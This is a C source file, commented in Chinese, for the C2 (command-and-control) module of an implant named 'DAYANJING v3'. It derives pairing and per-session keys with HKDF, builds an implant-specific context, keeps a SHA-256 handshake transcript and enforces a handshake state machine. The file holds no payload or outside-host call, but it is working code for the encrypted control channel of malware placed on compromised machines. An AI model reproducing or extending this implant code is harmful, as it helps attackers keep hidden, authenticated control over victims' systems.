/*
 * DAYANJING v3 — c2.c
 *
 * C2 握手与会话密钥派生。与 Python 侧 key_derivation.py 逐字节对齐。
 */

#include "c2.h"
#include "crypto_hash.h"

#include <stdlib.h>
#include <string.h>

/* ---- 协议标签（与 Python 侧常量严格一致，用 sizeof-1 避免手数长度出错） ---- */
#define LBL_PROTO      "dayanjing-c2/v1"
#define LBL_SERVER     "implant-pair:server:v1"
#define LBL_IDENTITY   "implant-pair:identity:v1"
#define LBL_SESS_C2S     "session:c2s:v1"
#define LBL_SESS_S2C     "session:s2c:v1"
#define LBL_SESS_CONFIRM "session:confirm:v1"

/* ---- 内部工具 ---- */

static void zero(void *p, size_t n)
{
    volatile uint8_t *vp = (volatile uint8_t *)p;
    while (n--) *vp++ = 0;
}

/* 拼接 label + ctx 作为 HKDF info */
static uint8_t *join_info(const char *label, size_t label_len,
                          const uint8_t *ctx, size_t ctx_len,
                          size_t *out_len)
{
    uint8_t *p = (uint8_t *)malloc(label_len + ctx_len);
    if (!p) return NULL;
    memcpy(p, label, label_len);
    if (ctx && ctx_len) memcpy(p + label_len, ctx, ctx_len);
    *out_len = label_len + ctx_len;
    return p;
}

/* ====================================================================
 * 密钥派生
 * ==================================================================== */

int c2_derive_pair(const uint8_t *psk, size_t psk_len,
                   const uint8_t salt_reg[C2_SALT_REG_LEN],
                   c2_keymat_t *km)
{
    uint8_t prk[HKDF_HASH_LEN];

    if (!psk || !salt_reg || !km) return C2_ERR_ARG;
    if (psk_len < C2_PSK_MIN_LEN) return C2_ERR_LEN;

    if (hkdf_extract(salt_reg, C2_SALT_REG_LEN, psk, psk_len, prk) != HASH_OK)
        return C2_ERR_ARG;

    if (hkdf_expand(prk, (const uint8_t *)LBL_SERVER,
                    sizeof(LBL_SERVER) - 1, km->k_server_hold,
                    C2_KEY_LEN) != HASH_OK) {
        zero(prk, sizeof(prk));
        return C2_ERR_ARG;
    }
    if (hkdf_expand(prk, (const uint8_t *)LBL_IDENTITY,
                    sizeof(LBL_IDENTITY) - 1, km->k_identity,
                    C2_KEY_LEN) != HASH_OK) {
        zero(prk, sizeof(prk));
        return C2_ERR_ARG;
    }

    zero(prk, sizeof(prk));
    return C2_OK;
}

int c2_build_context(const uint8_t server_static_id[C2_SERVER_ID_LEN],
                     const char *implant_id,
                     uint64_t generation,
                     uint8_t *out, size_t cap, size_t *out_len)
{
    const uint8_t *lbl = (const uint8_t *)LBL_PROTO;
    size_t lbl_len = sizeof(LBL_PROTO) - 1;
    size_t id_len  = implant_id ? strlen(implant_id) : 0;
    size_t need, off = 0;
    int i;

    if (!server_static_id || !out_len) return C2_ERR_ARG;

    need = lbl_len + 8 + C2_SERVER_ID_LEN + id_len;
    *out_len = need;

    if (!out) return C2_OK;          /* 仅探测长度 */
    if (cap < need) return C2_ERR_LEN;

    memcpy(out + off, lbl, lbl_len);
    off += lbl_len;

    /* generation：8 字节大端，与 Python to_bytes(8,"big") 一致 */
    for (i = 0; i < 8; i++)
        out[off + i] = (uint8_t)(generation >> (56 - 8 * i));
    off += 8;

    memcpy(out + off, server_static_id, C2_SERVER_ID_LEN);
    off += C2_SERVER_ID_LEN;

    if (id_len) memcpy(out + off, implant_id, id_len);

    return C2_OK;
}

int c2_derive_session(const uint8_t master[C2_KEY_LEN],
                      const uint8_t transcript_hash[C2_TRANSCRIPT_LEN],
                      const uint8_t server_static_id[C2_SERVER_ID_LEN],
                      const char *implant_id,
                      uint64_t generation,
                      c2_session_keys_t *sk)
{
    uint8_t  prk[HKDF_HASH_LEN];
    uint8_t  ctxbuf[256];
    size_t   ctx_len = 0, info_len = 0;
    uint8_t *info = NULL;
    uint8_t  k_c2s[C2_KEY_LEN], k_s2c[C2_KEY_LEN], k_confirm[C2_KEY_LEN];
    int rc;

    if (!master || !transcript_hash || !server_static_id || !sk) return C2_ERR_ARG;

    if (hkdf_extract(transcript_hash, C2_TRANSCRIPT_LEN, master,
                     C2_KEY_LEN, prk) != HASH_OK)
        return C2_ERR_ARG;

    rc = c2_build_context(server_static_id, implant_id, generation,
                          ctxbuf, sizeof(ctxbuf), &ctx_len);
    if (rc != C2_OK) { zero(prk, sizeof(prk)); return rc; }

    /* k_c2s */
    info = join_info(LBL_SESS_C2S, sizeof(LBL_SESS_C2S) - 1, ctxbuf, ctx_len, &info_len);
    if (!info) { zero(prk, sizeof(prk)); return C2_ERR_ARG; }
    rc = hkdf_expand(prk, info, info_len, k_c2s, C2_KEY_LEN);
    zero(info, info_len); free(info);
    if (rc != HASH_OK) { zero(prk, sizeof(prk)); return C2_ERR_ARG; }

    /* k_s2c */
    info = join_info(LBL_SESS_S2C, sizeof(LBL_SESS_S2C) - 1, ctxbuf, ctx_len, &info_len);
    if (!info) { zero(prk, sizeof(prk)); return C2_ERR_ARG; }
    rc = hkdf_expand(prk, info, info_len, k_s2c, C2_KEY_LEN);
    zero(info, info_len); free(info);
    if (rc != HASH_OK) { zero(prk, sizeof(prk)); return C2_ERR_ARG; }

    /* k_confirm */
    info = join_info(LBL_SESS_CONFIRM, sizeof(LBL_SESS_CONFIRM) - 1, ctxbuf, ctx_len, &info_len);
    if (!info) { zero(prk, sizeof(prk)); return C2_ERR_ARG; }
    rc = hkdf_expand(prk, info, info_len, k_confirm, C2_KEY_LEN);
    zero(info, info_len); free(info);
    if (rc != HASH_OK) { zero(prk, sizeof(prk)); return C2_ERR_ARG; }

    zero(prk, sizeof(prk));

    /* 强制方向密钥分离：碰撞即拒绝输出（H8 修正，禁单密钥退化） */
    if (memcmp(k_c2s, k_s2c, C2_KEY_LEN) == 0) {
        zero(k_c2s, sizeof(k_c2s)); zero(k_s2c, sizeof(k_s2c));
        zero(k_confirm, sizeof(k_confirm));
        return C2_ERR_COLLIDE;
    }

    memcpy(sk->k_c2s,     k_c2s,     C2_KEY_LEN);
    memcpy(sk->k_s2c,     k_s2c,     C2_KEY_LEN);
    memcpy(sk->k_confirm, k_confirm, C2_KEY_LEN);
    return C2_OK;
}

/* ====================================================================
 * Transcript
 * ==================================================================== */

void c2_transcript_init(c2_transcript_t *t)
{
    if (!t) return;
    t->opaque = malloc(sizeof(sha256_ctx));
    if (t->opaque) sha256_init((sha256_ctx *)t->opaque);
}

void c2_transcript_feed(c2_transcript_t *t, const uint8_t *data, size_t len)
{
    if (!t || !t->opaque) return;
    sha256_update((sha256_ctx *)t->opaque, data, len);
}

void c2_transcript_final(c2_transcript_t *t, uint8_t out[C2_TRANSCRIPT_LEN])
{
    if (!t || !t->opaque || !out) return;
    sha256_final((sha256_ctx *)t->opaque, out);
}

void c2_transcript_free(c2_transcript_t *t)
{
    if (!t || !t->opaque) return;
    zero(t->opaque, sizeof(sha256_ctx));
    free(t->opaque);
    t->opaque = NULL;
}

/* ====================================================================
 * 握手状态机
 * ==================================================================== */

const char *c2_hs_state_name(c2_hs_state_t s)
{
    switch (s) {
        case C2_HS_INIT:     return "INIT";
        case C2_HS_HELLO:    return "HELLO";
        case C2_HS_WELCOME:  return "WELCOME";
        case C2_HS_FINISHED: return "FINISHED";
        case C2_HS_ACTIVE:   return "ACTIVE";
        case C2_HS_FAILED:   return "FAILED";
        default:             return "UNKNOWN";
    }
}

int c2_hs_can(c2_hs_state_t cur, c2_hs_state_t next)
{
    /* FAILED 是终态，不可再转移 */
    if (cur == C2_HS_FAILED) return 0;
    /* 任何非终态都可显式进入 FAILED */
    if (next == C2_HS_FAILED) return 1;

    switch (cur) {
        case C2_HS_INIT:     return next == C2_HS_HELLO;
        case C2_HS_HELLO:    return next == C2_HS_WELCOME;
        case C2_HS_WELCOME:  return next == C2_HS_FINISHED;
        case C2_HS_FINISHED: return next == C2_HS_ACTIVE;
        case C2_HS_ACTIVE:   return 0;   /* 应用数据阶段不再回退 */
        default:             return 0;
    }
}

void c2_hs_init(c2_handshake_t *h)
{
    if (!h) return;
    h->state = C2_HS_INIT;
    c2_transcript_init(&h->tr);
}

void c2_hs_free(c2_handshake_t *h)
{
    if (!h) return;
    c2_transcript_free(&h->tr);
    h->state = C2_HS_INIT;
}

int c2_hs_step(c2_handshake_t *h, c2_hs_state_t next,
               const uint8_t *msg, size_t len)
{
    if (!h) return C2_ERR_ARG;

    /* 非法转移：不改变状态，也不污染 transcript（防降级/重放） */
    if (!c2_hs_can(h->state, next)) return C2_ERR_STATE;

    if (msg && len) c2_transcript_feed(&h->tr, msg, len);

    h->state = next;
    return C2_OK;
}

int c2_hs_transcript(const c2_handshake_t *h, uint8_t out[C2_TRANSCRIPT_LEN])
{
    sha256_ctx tmp;

    if (!h || !out || !h->tr.opaque) return C2_ERR_ARG;

    /* 复制后再 final，避免终结掉可继续累积的 transcript */
    tmp = *(const sha256_ctx *)h->tr.opaque;
    sha256_final(&tmp, out);
    zero(&tmp, sizeof(tmp));
    return C2_OK;
}
